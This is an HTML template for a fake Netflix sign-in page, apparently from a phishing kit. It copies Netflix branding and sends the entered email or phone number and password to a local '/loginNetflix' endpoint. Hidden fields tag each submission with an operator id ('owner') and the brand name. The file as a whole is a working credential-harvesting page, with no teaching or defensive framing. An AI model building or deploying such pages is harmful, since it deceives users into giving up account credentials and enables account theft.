<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Netflix</title>
    <link rel="stylesheet" href="/static/netflix/netflix.css">
    <link rel="icon" type="image/png" href="/static/netflix/netflix_icon.png">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script>
        function checktext() {
            const user = document.getElementById("username").value.trim();
            const pass = document.getElementById("password").value.trim();
            const btn = document.getElementById("login-button");
            if (user.length > 4 && pass.length > 4) {
                btn.disabled = false;
                btn.style.backgroundColor = '#e50914';
            } else {
                btn.disabled = true;
                btn.style.backgroundColor = '#b81d24';
            }
        }
    </script>
</head>
<body>
    <div class="netflix-container">
        <img src="/static/netflix/netflix_logo.svg" class="logo" alt="Netflix">
        <div class="login-box">
            <form action="/loginNetflix" method="POST">
                <h1>Sign In</h1>
                <input type="text" name="uid" id="username" placeholder="Email or phone number" onkeyup="checktext()" required>
                <input type="password" name="pas" id="password" placeholder="Password" onkeyup="checktext()" required>
                <input type="text" name="owner" hidden value="{{ uid }}">
                <input type="text" name="app" hidden value="Netflix">
                <button id="login-button" type="submit" disabled>Sign In</button>
                <div class="help-links">
                    <label><input type="checkbox"> Remember me</label>
                    <a href="#">Need help?</a>
                </div>
            </form>
        </div>
    </div>
</body>
</html>
